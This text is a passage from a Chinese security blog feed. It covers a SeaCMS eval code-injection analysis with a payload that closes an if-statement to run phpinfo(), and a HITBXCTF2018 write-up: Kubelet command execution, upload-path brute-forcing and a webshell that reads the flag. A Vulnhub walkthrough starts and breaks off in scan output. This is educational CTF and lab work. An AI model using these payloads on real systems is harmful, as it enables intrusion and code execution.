class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$content</span>);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$elseIfArray</span> = explode(<span class="hljs-variable">$labelRule2</span>, <span class="hljs-variable">$strThen</span>);<br>                <span class="hljs-variable">$elseIfArrayLen</span> = count(<span class="hljs-variable">$elseIfArray</span>);<br>                <span class="hljs-variable">$elseIfSubArray</span> = explode(<span class="hljs-variable">$labelRule3</span>, <span class="hljs-variable">$elseIfArray</span>[<span class="hljs-variable">$elseIfArrayLen</span> - <span class="hljs-number">1</span>]);<br>                <span class="hljs-variable">$resultStr</span> = <span class="hljs-variable">$elseIfSubArray</span>[<span class="hljs-number">1</span>];<br>                <span class="hljs-variable">$elseIfArraystr0</span> = addslashes(<span class="hljs-variable">$elseIfArray</span>[<span class="hljs-number">0</span>]);<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(<span class="hljs-subst">&#123;$strIf&#125;</span>)&#123;\$resultStr=\&quot;<span class="hljs-subst">&#123;$elseIfArraystr0&#125;</span>\&quot;;&#125;&quot;</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-variable">$elseIfLen</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$elseIfLen</span> &lt; <span class="hljs-variable">$elseIfArrayLen</span>; <span class="hljs-variable">$elseIfLen</span>++) &#123;<br>                    <span class="hljs-variable">$strElseIf</span> = getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfArray</span>[<span class="hljs-variable">$elseIfLen</span>], <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                    <span class="hljs-variable">$strElseIf</span> = <span class="hljs-keyword">$this</span>-&gt;parseStrIf(<span class="hljs-variable">$strElseIf</span>);<br>                    <span class="hljs-variable">$strElseIfThen</span> = addslashes(getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfArray</span>[<span class="hljs-variable">$elseIfLen</span>], <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>));<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strElseIf</span> . <span class="hljs-string">&quot;)&#123;\$resultStr=\&quot;<span class="hljs-subst">&#123;$strElseIfThen&#125;</span>\&quot;;&#125;&quot;</span>);<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strElseIf</span> . <span class="hljs-string">&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elseIfFlag</span>) &#123;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-variable">$strElseIf0</span> = getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfSubArray</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-variable">$strElseIfThen0</span> = addslashes(getSubStrByFromAndEnd(<span class="hljs-variable">$elseIfSubArray</span>[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>));<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$strElseIf0</span>, <span class="hljs-string">&#x27;==&#x27;</span>) === <span class="hljs-literal">false</span> &amp;&amp; strpos(<span class="hljs-variable">$strElseIf0</span>, <span class="hljs-string">&#x27;=&#x27;</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$strElseIf0</span> = str_replace(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;==&#x27;</span>, <span class="hljs-variable">$strElseIf0</span>);<br>                &#125;<br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strElseIf0</span> . <span class="hljs-string">&quot;)&#123;\$resultStr=\&quot;<span class="hljs-subst">&#123;$strElseIfThen0&#125;</span>\&quot;;\$elseIfFlag=true;&#125;&quot;</span>);<br>                <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$resultStr</span>, <span class="hljs-variable">$content</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到下面存在<code>eval()</code>函数来执行代码，要想进入到<code>eval()</code>，<code>$content</code>中必须含有<code>&#123;if:</code>字符串。</p><p>然后是正则，</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$la</span>belRule = buildregx(<span class="hljs-string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>,<span class="hljs-string">&quot;is&quot;</span>);<br>preg_match_all(<span class="hljs-symbol">$la</span>belRule,<span class="hljs-symbol">$co</span>ntent,<span class="hljs-symbol">$iar</span>);<br></code></pre></td></tr></table></figure><p>看代码执行流程，在<code>eval()</code>函数中，<code>$strIf</code>就是之前<code>preg_match_all()</code>中第一个<code>(.*?)</code>匹配出来的值。</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">@eval(<span class="hljs-string">&quot;if(&quot;</span>.<span class="hljs-variable">$strIf</span>.<span class="hljs-string">&quot;)&#123;\<span class="hljs-variable">$ifFlag</span>=true;&#125;else&#123;\<span class="hljs-variable">$ifFlag</span>=false;&#125;&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在<code>eval()</code>中，要闭合前面的if语句，可以构造<code>1)phpinfo();if(1</code>，又要符合正则<code>&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;</code>，再看标签：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;time&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;orderhits&quot;</span>&gt;最新上映&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>由于<code>$order</code>替换的是<code>&#123;searchpage:ordername&#125;</code>，所以，在<code>1)phpinfo();if(1</code>基础上添加。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#125;&#123;<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span>&#125;&#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)phpinfo();<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>&#125;&#123;<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><p>漏洞利用的基本流程就是这样，简单来说，就是有个可控的变量没有经过过滤，就被带入了<code>eval()</code>中，导致了代码执行。</p><h3 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h3><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">SeaCMS v6.45前台Getshell 代码执行 </a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>代码执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HITBXCTF2018-Baby baby &amp;&amp; upload</title>
    <link href="/2018/04/18/HITBXCTF2018-Baby-baby-upload/"/>
    <url>/2018/04/18/HITBXCTF2018-Baby-baby-upload/</url>
    
    <content type="html"><![CDATA[<p>前几天在HITBXCTF划了波水，就做出了几个水题，不过题目考察的东西还是挺新的，写个Writeup记一下。</p><a id="more"></a><h3 id="1-Web-Baby-baby"><a href="#1-Web-Baby-baby" class="headerlink" title="1. Web-Baby baby"></a>1. Web-Baby baby</h3><h4 id="1-1-题目要求"><a href="#1-1-题目要求" class="headerlink" title="1.1 题目要求"></a>1.1 题目要求</h4><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">This <span class="hljs-keyword">is</span> a pentest challenge, target <span class="hljs-number">47.75</span><span class="hljs-number">.146</span><span class="hljs-number">.42</span><br>http:<span class="hljs-comment">//47.75.146.42</span><br></code></pre></td></tr></table></figure><h3 id="1-2-解题步骤"><a href="#1-2-解题步骤" class="headerlink" title="1.2 解题步骤"></a>1.2 解题步骤</h3><p>直接访问没啥有价值的东西，使用Nmap扫描端口</p><p>命令：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -v -sV -p- <span class="hljs-number">47.75.146.42</span><br></code></pre></td></tr></table></figure><p>结果</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PORT</span>      STATE  SERVICE       VERSION<br><span class="hljs-attribute">22</span>/tcp    open   ssh           OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">4</span> (protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp    open   http          nginx <span class="hljs-number">1</span>.<span class="hljs-number">12</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">443</span>/tcp   closed https<br><span class="hljs-attribute">2333</span>/tcp  closed unknown<br><span class="hljs-attribute">3389</span>/tcp  closed ms-wbt-server<br><span class="hljs-attribute">8009</span>/tcp  closed ajp<span class="hljs-number">13</span><br><span class="hljs-attribute">9999</span>/tcp  open   http          nginx <span class="hljs-number">1</span>.<span class="hljs-number">12</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">10250</span>/tcp open   ssl/unknown<br></code></pre></td></tr></table></figure><p>大致测了测，9999端口不解析php，<br>直接访问：<code>http://47.75.146.42:9999/index.php</code></p><p>下载<code>index.php</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">This is a pentest challenge, open your mind!</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 300px;&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;jd.png&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;the picture is unrelated to this challenge, just a advertisement&quot;</span> /&gt;</span></span><br><br><span class="php"><span class="hljs-meta">&lt;?php</span></span><br><span class="php">    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$__POST</span>[<span class="hljs-string">&quot;backdoor&quot;</span>]);</span><br><span class="php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>没啥用，查10250端口,找到一篇博客，上面写得很详细，直接利用。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">https:<span class="hljs-regexp">//ri</span>cterz.me/posts/Security%20Issues%20of%20Kubelet%20HTTP%28s%29%20Server<br></code></pre></td></tr></table></figure><p>通过 /runningpods 获取正在运行的 Pod 列表：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">47.75</span>.<span class="hljs-number">146.42</span>:<span class="hljs-number">10250</span>/runningpods<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/HITBCTF2018-Web-baby-1.png"></p><p>然后有命令执行漏洞，可以在容器里执行命令。一个个找flag</p><p><img src="https://image.mengsec.com/HITBCTF2018-Web-baby-2.png"></p><p>在根目录发现flag.txt,直接读取</p><p><img src="https://image.mengsec.com/HITBCTF2018-Web-baby-3.png"></p><p>HITB{KKKKKKKKKKKKKKKKKKKKKKKKK}</p><h3 id="2-Web-Upload"><a href="#2-Web-Upload" class="headerlink" title="2. Web-Upload"></a>2. Web-Upload</h3><h4 id="2-1-题目要求"><a href="#2-1-题目要求" class="headerlink" title="2.1 题目要求"></a>2.1 题目要求</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Get shell !<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">47.90</span>.<span class="hljs-number">97.18</span>:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p>题目环境是Windows IIS7.0+php<br>直接右键查看源代码，发现提示。</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-1.png" alt="image"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--pic.php?filename=default.jpg--&gt;</span><br></code></pre></td></tr></table></figure><p>访问一下，会返回default.jpg的长和宽</p><p>随便找个文件上传，回显了一个文件名。</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-2.png" alt="image"></p><p>令filename=返回的文件名，会给出上传图片的长和宽。</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-3.png" alt="image"></p><p>看样子后台用函数getimagesize()来处理文件，但是PHP中getimagesize()函数有漏洞，这和前几天dedecms爆后台目录的原理一眼，详情</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/column/</span><span class="hljs-number">164698</span>.html<br></code></pre></td></tr></table></figure><p>然后可以借助pic.php的功能来穷举出上传文件的目录，由于爆破的人太多，使用burp单线程进行爆破，如图，这样就知道目录第一个字符是8,依次往后一位位找。</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-4.png" alt="image"></p><p>最后就能得到文件上传的目录</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">?filename=..<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\.</span>.<span class="hljs-symbol">\i</span>netpub<span class="hljs-symbol">\w</span>wwroot<span class="hljs-symbol">\8</span>7194f13726af7cee27ba2cfe97b60df<span class="hljs-symbol">\1</span>523619718.png<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-5.png" alt="image"></p><p>然后就可以直接上传shell。</p><blockquote><p>参考链接：<a href="https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/">https://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/</a></p></blockquote><p>利用Windows系统特性，构造：</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-6.png" alt="image"></p><p>直接上传后，访问，成功解析。</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-7.png" alt="image"></p><p>在phpinofo()中查看被禁用的函数</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">assert,passthru,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">chroot</span>,scandir,chgrp,<span class="hljs-keyword">chown</span>,shell_exec,proc_open,proc_get_status,ini_alter,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,<span class="hljs-keyword">readlink</span>,<span class="hljs-keyword">symlink</span>,popepassthru,stream_socket_server,fsocket,fsockopen<br></code></pre></td></tr></table></figure><p>构造代码列出目录文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">listDirFiles</span>(<span class="hljs-params"><span class="hljs-variable">$DirPath</span></span>)</span>&#123; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dir</span> = opendir(<span class="hljs-variable">$DirPath</span>))&#123; <br>         <span class="hljs-keyword">while</span>((<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$dir</span>))!== <span class="hljs-literal">false</span>)&#123; <br>                <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-variable">$DirPath</span>.<span class="hljs-variable">$file</span>)) <br>                &#123; <br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;filename: <span class="hljs-subst">$file</span>&lt;br /&gt;&quot;</span>; <br>                &#125; <br>         &#125; <br>    &#125; <br>&#125;<br>listDirFiles(<span class="hljs-string">&#x27;c:/Inetpub/wwwroot/&#x27;</span>);<br></code></pre></td></tr></table></figure><p>利用hackbar进行URL编码后上传。发现有flag.php</p><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-8.png" alt="image"></p><p>再构造代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;c:/Inetpub/wwwroot/flag.php&quot;</span>;<br>  <span class="hljs-variable">$handle</span> = fopen(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-variable">$contents</span> = fread(<span class="hljs-variable">$h</span>![image](https:<span class="hljs-comment">//note.youdao.com/favicon.ico)andle, filesize($filename));</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$contents</span>;<br>  fclose(<span class="hljs-variable">$handle</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/HITBXCTF2018-Web-upload-9.png" alt="image"></p><p>成功获取flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnhub-billub0x-Writeup</title>
    <link href="/2018/04/11/Vulnhub-billub0x-Writeup/"/>
    <url>/2018/04/11/Vulnhub-billub0x-Writeup/</url>
    
    <content type="html"><![CDATA[<p>从表哥那里知道了<a href="https://www.vulnhub.com/">Vulnhub</a>这个网站，从上面找了个镜像练练手，难度不大，都是些基本的操作，在此记录下。</p><a id="more"></a><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p><a href="https://www.vulnhub.com/entry/billu-b0x,188/">镜像下载地址</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">his Virtual machine <span class="hljs-keyword">is</span> <span class="hljs-keyword">using</span> ubuntu (<span class="hljs-number">32</span> <span class="hljs-type">bit</span>)<br>Other packages used: -<br>PHP<br>Apache<br>MySQL<br>This virtual machine <span class="hljs-keyword">is</span> <span class="hljs-keyword">having</span> medium difficulty <span class="hljs-keyword">level</span> <span class="hljs-keyword">with</span> tricks.<br>One need <span class="hljs-keyword">to</span> break <span class="hljs-keyword">into</span> VM <span class="hljs-keyword">using</span> web application <span class="hljs-keyword">and</span> <span class="hljs-keyword">from</span> there escalate <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">to</span> gain root <span class="hljs-keyword">access</span><br><span class="hljs-keyword">For</span> <span class="hljs-keyword">any</span> query ping me at https://twitter.com/IndiShell1046<br><br>Enjoy the machine<br></code></pre></td></tr></table></figure><p>最终目标是拿到服务器root权限</p><h2 id="2-渗透测试过程"><a href="#2-渗透测试过程" class="headerlink" title="2. 渗透测试过程"></a>2. 渗透测试过程</h2><p>先简单说一下测试环境的IP</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">攻击机:</span><br><span class="hljs-section">Windows: 192.168.134.1</span><br><span class="hljs-section">Kali: 192.168.134.132</span><br><span class="hljs-section">靶机:</span><br><span class="hljs-section">Ubuntu: 192.168.134.130</span><br></code></pre></td></tr></table></figure><h3 id="2-1-信息收集"><a href="#2-1-信息收集" class="headerlink" title="2.1 信息收集"></a>2.1 信息收集</h3><p>首先在Kali上使用Nmap扫描靶机，执行命令：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><br></code></pre></td></tr></table></figure><p>获得结果：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">PORT</span>   <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span> <span class="hljs-string">VERSION</span><br><span class="hljs-number">22</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ssh</span>     <span class="hljs-string">OpenSSH</span> <span class="hljs-number">5.</span><span class="hljs-string">9p1</span> <span class="hljs-string">Debian</span> <span class="hljs-string">5ubuntu1.4</span> <span class="hljs-string">(Ubuntu</span> <span class="hljs-string">Linux;</span> <span class="hljs-string">protocol</span> <span class="hljs-number">2.0</span><span class="hljs-string">)</span><br><span class="hljs-string">|</span> <span class="hljs-attr">ssh-hostkey:</span> <br><span class="hljs-string">|</span>   <span class="hljs-number">1024 </span><span class="hljs-string">fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de</span> <span class="hljs-string">(DSA)</span><br><span class="hljs-string">|</span>   <span class="hljs-number">2048 </span><span class="hljs-number">88</span><span class="hljs-string">:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8</span> <span class="hljs-string">(RSA)</span><br><span class="hljs-string">|_</span>  <span class="hljs-number">256</span> <span class="hljs-string">0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca</span> <span class="hljs-string">(ECDSA)</span><br><span class="hljs-number">80</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">http</span>    <span class="hljs-string">Apache</span> <span class="hljs-string">httpd</span> <span class="hljs-number">2.2</span><span class="hljs-number">.22</span> <span class="hljs-string">((Ubuntu))</span><br><span class="hljs-string">|</span> <span class="hljs-attr">http-cookie-flags:</span> <br><span class="hljs-string">|</span>   <span class="hljs-string">/:</span> <br><span class="hljs-string">|</span>     <span class="hljs-attr">PHPSESSID:</span> <br><span class="hljs-string">|_</span>      <span class="hljs-string">httponly</span> <span class="hljs-string">flag</span> <span class="hljs-string">not</span> <span class="hljs-string">set</span><br><span class="hljs-string">|_http-server-header:</span> <span class="hljs-string">Apache/2.2.22</span> <span class="hljs-string">(Ubuntu)</span><br><span class="hljs-string">|_http-title:</span> <span class="hljs-string">--==[[IndiShell</span> <span class="hljs-string">Lab]]==--</span><br><span class="hljs-attr">MAC Address:</span> <span class="hljs-number">00</span><span class="hljs-string">:0C:29:E7:C7:9A</span> <span class="hljs-string">(VMware)</span><br><span class="hljs-attr">Device type:</span> <span class="hljs-string">general</span> <span class="hljs-string">purpose</span><br><span class="hljs-attr">Running:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">3.</span><span class="hljs-string">X|4.X</span><br><span class="hljs-attr">OS CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel:3</span> <span class="hljs-string">cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-attr">OS details:</span> <span class="hljs-string">Linux</span> <span class="hljs-number">3.2</span> <span class="hljs-bullet">-</span> <span class="hljs-number">4.8</span><br><span class="hljs-attr">Network Distance:</span> <span class="hljs-number">1</span> <span class="hljs-string">hop</span><br><span class="hljs-attr">Service Info: OS:</span> <span class="hljs-string">Linux;</span> <span class="hljs-attr">CPE:</span> <span class="hljs-string">cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure><p>我们可以知道，靶机开启了80端口(HTTP)和22端口(SSH)。Web服务器是<code>Apache httpd 2.2.22</code>。<br>直接访问<code>http://192.168.134.130/</code></p><p><img src="https://image.mengsec.com/Vulnhub-billub0x-Writeup-1.png"></p><p>先别急着注入，使用Kali下的工具<code>dirb</code>扫一下目录。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/dirb/</span>wordlists/big.txt<br></code></pre></td></tr></table></figure><p>直接上大字典，扫出不少东西。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">---- Scanning URL: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/ ----<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/add (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">307</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/c (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">1</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/cgi-bin/</span> (CODE:<span class="hljs-number">403</span>|SIZE:<span class="hljs-number">291</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/head (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">2793</span>)<br>==&gt; DIRECTORY: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span class="hljs-regexp">/images/</span><br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/<span class="hljs-keyword">in</span> (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">47559</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/index (CODE:<span class="hljs-number">200</span>|SIZE:<span class="hljs-number">3267</span>)<br>+ http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span>/panel (CODE:<span class="hljs-number">302</span>|SIZE:<span class="hljs-number">2469</span>)<br>==&gt; DIRECTORY: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">134.130</span><span 